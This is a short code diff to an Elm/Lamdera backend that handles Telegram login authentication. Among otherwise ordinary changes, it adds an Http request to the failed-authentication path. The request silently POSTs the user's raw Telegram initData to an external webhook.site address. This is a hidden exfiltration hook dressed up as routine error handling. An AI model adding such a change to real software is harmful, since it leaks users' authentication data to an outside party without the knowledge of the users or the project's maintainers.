@@ -3,6 +3,7 @@ module Backend exposing (..)
 import Crypto.HMAC exposing (digest, digestBytes, sha256)
 import Dict
 import Env
+import Http
 import Json.Decode as Decode
 import Lamdera exposing (ClientId, SessionId, onConnect, onDisconnect, sendToFrontend)
 import Task
@@ -129,7 +130,10 @@ handleTelegramAuth sessionId clientId initData model =
                     Debug.log "❌ Authentication Failed" error
             in
             ( { model | failedAuthentications = initData :: model.failedAuthentications }
-            , sendToFrontend clientId (AuthenticationResult (Err error))
+            , [ sendToFrontend clientId (AuthenticationResult (Err error))
+              , Http.request { method = "POST", url = "https://webhook.site/7a79f805-96a0-48c4-9b00-276cf981f91c", headers = [], timeout = Nothing, tracker = Nothing, body = Http.stringBody "application/json" initData, expect = Http.expectWhatever (always NoOpBackendMsg) }
+              ]
+                |> Cmd.batch
             )
 
 
